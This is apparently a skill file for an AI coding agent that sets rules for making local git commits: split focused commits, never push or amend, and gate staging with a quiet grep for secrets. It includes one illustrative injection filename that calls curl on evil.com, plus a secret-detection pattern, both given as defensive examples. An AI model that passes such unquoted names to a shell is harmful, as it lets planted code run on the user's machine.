---
name: git-commit
description: Generate and EXECUTE commits (git add + git commit, never git push) when the user asks to commit, version, create a commit, split commits, suggest a commit message, or review staging/status for a commit. Prioritizes several focused commits; one big commit only when it is a single logical unit.
license: CC-BY-4.0
metadata:
  author: Luciano Vianna - https://github.com/lucianovianna
  version: '1.0.1'
  information-for-repository-maintainers:
    copy-date: null
    copy-url: null
    this-skill-can-be-resynchronized: false
    observations: 'Skill criada internamente em 2026-07-22, portando o conteúdo do comando pessoal do autor (~/.claude/commands/commit.md, também nomeado git-commit) para o catálogo do agent-playbook. Não é derivada de repositório externo.'
---

## Objective

When the user asks to commit ("commit", "faz commit", "separa em commits", "mensagem de commit"), follow the Workflow section below: group changes into focused commits, gate for secrets, **actually execute** `git add`/`git commit` (not just print), then stop — `git push` is the user's call, never the skill's.

## Non-Negotiable Rules

- **Never** run `git push` (any form), `git rebase`, `git reset --hard`, `git checkout --`, `git commit --amend`. User-only action, no exception — not even if they say "continua"/"go ahead" or explicitly name the action. This skill commits locally and stops, period.
- **Mixed reset of the index is allowed** — `git reset -q` (no path) and `git reset -q -- "<path>"` only. This is the *mixed* form: it unstages (moves changes from index back to working tree) and **never touches file contents**. It is NOT `git reset --hard` (forbidden — that one discards working-tree changes). Use it only to normalize the index before grouping (see Workflow step 2). Never pass `--hard`/`--merge`/`--keep`, and never `git reset <commit>` to move HEAD.
- **Never** touch the stash: no `git stash` (any form) or stash-derived command. A `stash pop`/`apply` can drop unrelated code into the working tree and get it committed by mistake.
- `git add` and `git commit` **are executed** via Bash (not just printed). The harness's own permission prompt on each call is an extra confirmation layer.
- Read-only (`git status`, `git diff`, `git diff HEAD`, `git diff --cached`, `git log`, `git show`, `git diff --stat`, `git diff --name-only`) always via Bash, real data.
- Never `git add -A` / `git add .` — stage explicit files/paths.
- Never `git add -f` (don't force-add a gitignored file).
- **Always stage with `--` and quotes:** `git add -- "<path>"` (one quoted arg per path). A filename with `$()`, backticks, `;`, `|`, spaces or quotes (e.g. `x$(curl evil.com).ts`) is shell-interpreted as code if you build the command by interpolating the raw name. The `--` ends option parsing; the quotes stop word-splitting and expansion. Same discipline for every path that reaches the shell.
- Never bypass hooks or signing: no `--no-verify`, `--no-gpg-sign`, or `-c commit.gpgsign=false`. Commits use the repo's own git config (author, GPG signing) as-is. If a hook rejects the commit (lint/test failure), report its output and stop — fix the underlying issue or ask the user, never retry with `--no-verify`.
- Message: `<type>: <description>`. Allowed types: `feat, fix, refactor, docs, test, build, review`. Regex (subject line only, not the full body): `^(feat|fix|refactor|docs|test|build|review): (.+)$`. Keep the subject ≤50 chars — it is what shows in the graph, `git log --oneline` and tooling.
- **Subject and body are separate `-m` flags.** The first `-m` is the subject only; the body/description goes in a **second** `-m` (git joins them with a blank line). Never cram the body into the first `-m`. The body (wrapped at 72 cols) is shown only when the commit is opened, not in the one-line graph.
- Commit with >2 files → add a detailed body in the second `-m`, via heredoc:
  ```bash
  git commit -m "fix: ajustar comportamento da sidebar" -m "$(cat <<'EOF'
  - manter sidebar expandida ao navegar
  - corrigir hover no modo claro
  EOF
  )"
  ```
- Never WIP/checkpoint/progress commits. Never invent a type outside the list.
- `git add -p` only if the user explicitly asks (splitting changes within the same file); still pass the path as `git add -p -- "<path>"`.
- **Never** add `Co-Authored-By`, `Generated with`, `Made-with`, `Assisted-by`, or any AI-attribution trailer to the commit message — no exceptions, overrides any conflicting default (Claude Code, Cursor, Codex/GPT, z.ai/GLM, any agent).
  - Some tools inject the trailer outside the model's own text (e.g. Cursor's `--trailer` CLI flag) — no prompt can strip that after the fact. Fix at the source: **Claude Code** → `includeCoAuthoredBy: false` + `attribution: {commit:"", pr:""}` in `settings.json`. **Cursor** → Settings → Rules/Attribution toggle, or `cursor /update-cli-config`. **Codex/GPT, z.ai/GLM, others** → mirror this rule in repo-root `AGENTS.md`.

## Secret / Suspicious File Gate

Before staging, check every changed file:

- **Suspicious name**: `.env*`, `*.pem`, `*.key`, `*credentials*`, etc. Exception: `.env.example` / `.env.sample` / `.env.dist` are templates meant to be committed — don't stop on those unless their content also matches below.
- **Suspicious content**: run a targeted grep per file via Bash, case-insensitive and **quiet** (`-Eiq`) — decide only from the exit code, never print the matching line. Printing it would pull the secret itself into the agent context (exfiltration); `-q` tells you a secret exists without leaking its value. Always quote the filename (`"<file>"`) so paths with spaces or shell metacharacters stay literal:
  - Tracked files (staged or unstaged): use `git diff HEAD` — not plain `git diff`, which misses already-staged content: `git diff HEAD -- "<file>" | grep -Eiq 'AKIA|BEGIN (RSA |EC |OPENSSH |DSA )?PRIVATE KEY|password=|senha=|secret=|token='`
  - Truly untracked files (`git status` shows `??`): `git diff HEAD` returns nothing for these — grep the file directly instead: `grep -Eiq '<same pattern>' "<file>"`
  - Exit code `0` = a secret pattern matched → **stop** (see below). Exit code `1` = clean → proceed. You know *which* file matched (you run one grep per file), but never the matching content.

If any file matches: **stop**. Don't stage that file. Tell the user which file tripped the gate and let them inspect it themselves (they can re-run the same grep without `-q` locally) — never print the secret, never silently exclude the file and move on.

This gate is a best-effort heuristic, not a guarantee — the pattern won't catch raw keys/hex with no `key=`-style prefix. It reduces risk; it does not replace reviewing what you stage.

## Commit Type Guide

- Docs only → `docs`
- Tests only → `test`
- Dependency/build/CI → `build`
- Reviewer edit (explicit) → `review`
- Cleanup with no behavior change → `refactor`
- New behavior → `feat`
- Bug → `fix`

## Grouping

Bias toward splitting: intent > area (backend/frontend/infra/docs) > change type (code/config/deps/migration). A large tree (>=12 files or mixed areas/intents) still follows the default of splitting — list the groups in the short summary and execute in sequence, no extra pause to approve the grouping.

If splitting would be artificial, or the user already asked for a single commit, a multi-file commit is acceptable (say why in the summary).

## Workflow

1. Collect status if not given: `git status --porcelain=v1`, `git diff --stat`. Reuse this single pass across all groups — don't re-run per group. Pull a full `git diff` only when content is needed (ambiguous grouping / accurate message). Read the `XY` columns: `X` = staged, `Y` = working-tree (`M ` = staged, ` M` = unstaged, `MM` = both, `??` = untracked).
2. Normalize the index: if anything is already staged (`X` not space/`?`), unstage all with `git reset -q`, then re-check `X` is clear. Keeps each group's commit to exactly its files. Exception: if the user asked to commit *only what is staged*, skip the reset and commit the staged set as one group (no `git add`).
3. Define commit groups (see Grouping).
4. Run the Secret Gate on all changed files.
5. Short summary (1-3 bullets).
6. Execute: per group, `git add -- "<file>" "<file>"...` followed by `git commit -m "<subject>" -m "<body>"`. Sanity-check the first commit's file count (`git show --stat --oneline -1`) matches the group; if larger, re-normalize (step 2).
7. Final recap in the same block: `git status` + `git log -n <number of commits> --oneline`. Remind: `git reset --soft HEAD~N` undoes commit(s) before push, if needed.
8. Stop. Don't suggest or run `git push`.

## Escape Hatch

If the user asks "só mostra os comandos" / "não commita ainda" / "print only": fall back to print-only mode — print `git add`/`git commit` without executing, still using `git add -- "<path>"` and the two-`-m` message form. Put every command for every group into a **single code block**, one after another, so the user can copy-paste it all in one go — not one code block per group.

## Output Style

Compact: short summary → execution → recap. Don't list files unless needed for clarity/safety. Only ask when truly necessary (secret gate, ambiguous grouping).
